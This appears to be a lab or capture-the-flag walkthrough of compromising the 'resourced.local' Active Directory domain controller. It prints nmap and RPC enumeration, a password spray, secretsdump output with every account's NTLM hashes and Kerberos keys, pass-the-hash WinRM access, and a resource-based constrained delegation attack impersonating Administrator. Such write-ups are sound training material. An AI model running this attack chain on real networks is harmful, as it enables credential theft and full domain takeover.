## First enumeration with nmap 

```shell
# Nmap 7.94SVN scan initiated Fri Feb 23 20:18:04 2024 as: nmap -sC -sV -T4 -oN service.nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -Pn 192.168.233.175
Nmap scan report for 192.168.233.175
Host is up (0.16s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-23 19:21:43Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-23T19:22:08
|_  start_date: N/A
|_clock-skew: 3m31s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 23 20:19:47 2024 -- 1 IP address (1 host up) scanned in 103.84 seconds
```


## Enumerating smb 

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Resourced]
└─$ smbclient -L //192.168.233.175/ -N 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.233.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
checking the smb server for anonymous share, we got nothing.

### Enumerating RPC 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Resourced]        
└─$ rpcclient 192.168.233.175 -U '' -N                                                         
rpcclient $> querydispinfo
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!
rpcclient $>   
```
login rpcclient anonymous, querying dominfo, we got users and a potential password. `HotelCalifornia194!`

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Resourced]
└─$ crackmapexec smb 192.168.153.175 -u users.txt -p 'HotelCalifornia194!'
SMB         192.168.153.175 445    RESOURCEDC       [*] Windows 10.0 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\administrator:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\d.durant:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\g.goldberg:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\j.johnson:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\k.keen:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\l.livingstone:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\m.mason:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\p.parker:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\r.robinson:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\s.swanson:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.153.175 445    RESOURCEDC       [+] resourced.local\v.ventz:HotelCalifornia194! 
SMB         192.168.153.175 445    RESOURCEDC       [-] Unexpected error with Neo4J
SMB         192.168.153.175 445    RESOURCEDC       [-] Account not found on the domain
```
checking for access, we got access to smb using the creds `v.ventz:HotelCalifornia194!` but not local admin, let's enumerate further. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/9ab5d134-368f-4a89-a43a-51bc94ec2731)

using crackmap to enumerate shares, we got some shares we can read. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/4c19ced2-97ef-466b-a489-40e9f3ce3b4a)

checking the smb shares `Password Audit`, we got some password registry files. 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/resourced]
└─$ impacket-secretsdump -system SYSTEM -security SECURITY LOCAL
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:507fdb105d9322cf53420c95780adf5f2dcdac7ca14f8b37188370c916a3fa6f2a511bb284aeac71211c939a866a2b4cc02c408e1d242ad4f5cc8f7b85d2448c18d23fb47f7b9b543a6cfb8999e40037f23dbfd8690869753979d15fe61bdcddb0ccff3d20c275207ca93e844c3b5aa1f658198225b3e54f90e0b71aaf76ba32bb1b598d189b6696c27d04674fd4c4f2c09d0df2e59fe93850aa928be813be3bd659f0d2ecba6e34fb5a3880db8155cf77e21eb44d63e1ae65abcc2aa5bdfb6bfe85e8590329929522aae501ba86d8622918e37b41daef8a2b00e78440d13e88a31fc14714923bba6fb99e13c81b3020
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd
dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931
[*] NL$KM 
 0000   31 BF AC 76 98 3E CF 4A  FC BD AD 0F 17 0F 49 E7   1..v.>.J......I.
 0010   DA 65 A6 F9 C7 D4 FA 92  0E 5C 60 74 E6 67 BE A7   .e.......\`t.g..
 0020   88 14 9D 4D E5 A5 3A 63  E4 88 5A AC 37 C7 1B F9   ...M..:c..Z.7...
 0030   53 9C C1 D1 6F 63 6B D1  3F 77 F4 3A 32 54 DA AC   S...ock.?w.:2T..
NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac
[*] Cleaning up...
```
using `impacket-secret` dump to dump stored hashes, we got nothing useful in the `SECURITY` let's try the `ntds`. 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/resourced]
└─$ impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL                                                                                                           
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:73410f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8
Administrator:aes128-cts-hmac-sha1-96:b4fc11e40a842fff6825e93952630ba2
Administrator:des-cbc-md5:80861f1a80f1232f
RESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4
RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6a
RESOURCEDC$:des-cbc-md5:ab089e317a161cc1
krbtgt:aes256-cts-hmac-sha1-96:12b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5
krbtgt:aes128-cts-hmac-sha1-96:3165b2a56efb5730cfd34f2df472631a
krbtgt:des-cbc-md5:f1b602194f3713f8
M.Mason:aes256-cts-hmac-sha1-96:21e5d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04
M.Mason:aes128-cts-hmac-sha1-96:99d5ca7207ce4c406c811194890785b9
M.Mason:des-cbc-md5:268501b50e0bf47c
K.Keen:aes256-cts-hmac-sha1-96:9a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6f
K.Keen:aes128-cts-hmac-sha1-96:e767891c7f02fdf7c1d938b7835b0115
K.Keen:des-cbc-md5:572cce13b38ce6da
L.Livingstone:aes256-cts-hmac-sha1-96:cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8f
L.Livingstone:aes128-cts-hmac-sha1-96:1dec73e935e57e4f431ac9010d7ce6f6
L.Livingstone:des-cbc-md5:bf01fb23d0e6d0ab
J.Johnson:aes256-cts-hmac-sha1-96:0452f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6
J.Johnson:aes128-cts-hmac-sha1-96:c438ef912271dbbfc83ea65d6f5fb087
J.Johnson:des-cbc-md5:ea01d3d69d7c57f4
V.Ventz:aes256-cts-hmac-sha1-96:4951bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28c
V.Ventz:aes128-cts-hmac-sha1-96:ea815fe7c1112385423668bb17d3f51d
V.Ventz:des-cbc-md5:4af77a3d1cf7c480
S.Swanson:aes256-cts-hmac-sha1-96:8a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085
S.Swanson:aes128-cts-hmac-sha1-96:6c5699aaa888eb4ec2bf1f4b1d25ec4a
S.Swanson:des-cbc-md5:5d37583eae1f2f34
P.Parker:aes256-cts-hmac-sha1-96:e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cb
P.Parker:aes128-cts-hmac-sha1-96:e71c552013df33c9e42deb6e375f6230
P.Parker:des-cbc-md5:083b37079dcd764f
R.Robinson:aes256-cts-hmac-sha1-96:90ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5b
R.Robinson:aes128-cts-hmac-sha1-96:2210ad6b5ae14ce898cebd7f004d0bef
R.Robinson:des-cbc-md5:7051d568dfd0852f
D.Durant:aes256-cts-hmac-sha1-96:a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27a
D.Durant:aes128-cts-hmac-sha1-96:8a2b701764d6fdab7ca599cb455baea3
D.Durant:des-cbc-md5:376119bfcea815f8
G.Goldberg:aes256-cts-hmac-sha1-96:0d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91
G.Goldberg:aes128-cts-hmac-sha1-96:00f4d3e907818ce4ebe3e790d3e59bf7
G.Goldberg:des-cbc-md5:3e20fd1a25687673
[*] Cleaning up... 
```
dumping using the ntds file, we got some hashes. 

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                         
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::                                                                                      
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::              
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939::: 
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::                                                                                     
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
```
usernames and hashes

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c867ca80-bdac-442f-971e-28c4038e8962)

cracked 1 of the password hash, `ItachiUchiha888`. tried to spray the password across the users, none wrked with it. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/987241b2-95ac-4cb1-9cf7-73e5f2d31014)

Using crackmap exec to spray the hashes againts the users, we can see we have smbclient access. 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/resourced]
└─$ crackmapexec winrm 192.168.194.175 -u l.livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
SMB         192.168.194.175 5985   RESOURCEDC       [*] Windows 10.0 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
HTTP        192.168.194.175 5985   RESOURCEDC       [*] http://192.168.194.175:5985/wsman
HTTP        192.168.194.175 5985   RESOURCEDC       [+] resourced.local\l.livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
HTTP        192.168.194.175 5985   RESOURCEDC       [-] Unexpected error with Neo4J
HTTP        192.168.194.175 5985   RESOURCEDC       [-] Account not found on the domain
```
checking if we could login `winrm` and it was success we couldlogin winrm. 

## Initial Foothold winrm

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/resourced]
└─$ evil-winrm -i 192.168.194.175 -u l.livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> whoami 
resourced\l.livingstone
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> 
```
we login winrm using the username and the hash. 


## Privilege Escalation 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1886b3eb-e7ef-4c94-9122-b5f789e4b731)

```powershell
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\L.Livingstone\Documents\ -OutputPrefix "sharpaudit"
```
use sharphound to collect the domain data. so we will analyze with bloodhound.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/16405635-7570-4b7c-9055-e8b40899083b)

using bloodhound to enumerate the data coollected, we can see that the user has a `Genericall` on `resourced.resourced.local`. let's abuse it.

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/resourced]
└─$ impacket-addcomputer -dc-ip 192.168.213.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'NIGHTHAWK$' -computer-pass 'HACKER1!'  resourced.local/l.livingstone
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

[*] Successfully added machine account NIGHTHAWK$ with password HACKER1!.
```
first we create a machine account in the domain by using user `l.livingstone` priv.

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/resourced]
└─$ impacket-rbcd -delegate-from 'NIGHTHAWK$' -delegate-to 'RESOURCEDC$' -action 'write' 'resourced.local/l.livingstone' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -dc-ip 192.168.213.175
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] NIGHTHAWK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     NIGHTHAWK$   (S-1-5-21-537427935-490066102-1511301751-4101)
```
We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/resourced]
└─$ impacket-getST -spn 'cifs/resourcedc.resourced.local' -impersonate 'Administrator' 'resourced/NIGHTHAWK$:HACKER1!' -dc-ip 192.168.213.175
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```
And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "Administrator" for. Impacket's getST.py example script can be used for that purpose.

```shell
export KRB5CCNAME=./Administrator.ccache
```
export KRB5Cname

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/14bc10fd-cc94-4082-bbec-3042a16f9c54)

add `192.168.213.175 resourcedc.resourced.local` to `/etc/hosts` file, 


